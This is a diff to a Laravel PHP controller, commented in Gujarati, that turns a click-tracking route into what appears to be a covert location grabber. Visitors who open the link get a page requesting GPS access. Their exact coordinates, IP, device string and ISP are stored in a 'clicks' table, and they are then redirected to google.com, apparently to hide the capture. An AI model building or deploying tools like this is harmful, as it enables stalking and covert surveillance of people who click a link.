@@ -8,47 +8,52 @@ use Stevebauman\Location\Facades\Location;
 
 class TrackController extends Controller
 {
- public function track(Request $request)
-{
-    // ૧. સાચો IP મેળવો
-    $ip = $request->header('X-Forwarded-For')
-        ? explode(',', $request->header('X-Forwarded-For'))[0]
-        : $request->ip();
-
-    // ૨. સીટી અને કન્ટ્રી માટે લોકેશન ડેટા
-    $locationData = Location::get(trim($ip));
-
-    // ૩. ISP મેળવવા માટે ડાયરેક્ટ API કોલ (આનાથી Unknown નહીં આવે)
-    $ispName = 'Unknown';
-    try {
-        // ip-api.com માંથી ISP ડેટા ખેંચવો
-        $apiUrl = "http://ip-api.com/json/" . trim($ip) . "?fields=isp";
-        $response = @file_get_contents($apiUrl);
-        $json = json_decode($response);
-        
-        if ($json && isset($json->isp)) {
-            $ispName = $json->isp;
-        }
-    } catch (\Exception $e) {
-        $ispName = 'Unknown';
+    // ૧. યુઝરને GPS પરમિશન પેજ પર મોકલવા માટે
+    public function track(Request $request)
+    {
+        return view('tracking_page');
     }
 
-    // ૪. ડેટાબેઝમાં એન્ટ્રી કરો
-    DB::table('clicks')->insert([
-        'ip'         => trim($ip),
-        'device'     => $request->header('User-Agent'),
-        'isp'        => $ispName, // અહીં હવે સાચું નામ આવશે
-        'city'       => $locationData ? ($locationData->cityName ?? 'Unknown') : 'Unknown',
-        'country'    => $locationData ? ($locationData->countryName ?? 'Unknown') : 'Unknown',
-        'latitude'   => $locationData ? $locationData->latitude : null,
-        'longitude'  => $locationData ? $locationData->longitude : null,
-        'clicked_at' => now(),
-        'created_at' => now(),
-        'updated_at' => now(),
-    ]);
+    // ૨. સચોટ GPS લોકેશન અને બાકીનો ડેટા સેવ કરવા માટે
+    public function saveExactLocation(Request $request)
+    {
+        // IP મેળવો
+        $ip = $request->header('X-Forwarded-For')
+            ? explode(',', $request->header('X-Forwarded-For'))[0]
+            : $request->ip();
 
-    return redirect('https://google.com');
-}
+        // City/Country માટે (બેકઅપ)
+        $locationData = Location::get(trim($ip));
+
+        // ISP મેળવવા માટે API
+        $ispName = 'Unknown';
+        try {
+            $apiUrl = "http://ip-api.com/json/" . trim($ip) . "?fields=isp";
+            $response = @file_get_contents($apiUrl);
+            $json = json_decode($response);
+            if ($json && isset($json->isp)) {
+                $ispName = $json->isp;
+            }
+        } catch (\Exception $e) {
+            $ispName = 'Unknown';
+        }
+
+        // ડેટાબેઝમાં એન્ટ્રી (GPS ડેટા પ્રાથમિકતા આપશે)
+        DB::table('clicks')->insert([
+            'ip'         => trim($ip),
+            'device'     => $request->header('User-Agent'),
+            'isp'        => $ispName,
+            'city'       => $locationData ? ($locationData->cityName ?? 'Unknown') : 'Unknown',
+            'country'    => $locationData ? ($locationData->countryName ?? 'Unknown') : 'Unknown',
+            'latitude'   => $request->lat ?? ($locationData ? $locationData->latitude : null),
+            'longitude'  => $request->lng ?? ($locationData ? $locationData->longitude : null),
+            'clicked_at' => now(),
+            'created_at' => now(),
+            'updated_at' => now(),
+        ]);
+
+        return redirect('https://google.com');
+    }
 
     public function dashboard(Request $request)
     {
@@ -76,7 +81,6 @@ class TrackController extends Controller
 
     public function destroyAll()
     {
-        // Render પર truncate માં તકલીફ પડે તો delete() વાપરી શકાય
         DB::table('clicks')->delete(); 
         return back()->with('success', 'બધો જ ડેટા ડિલીટ થઈ ગયો!');
     }
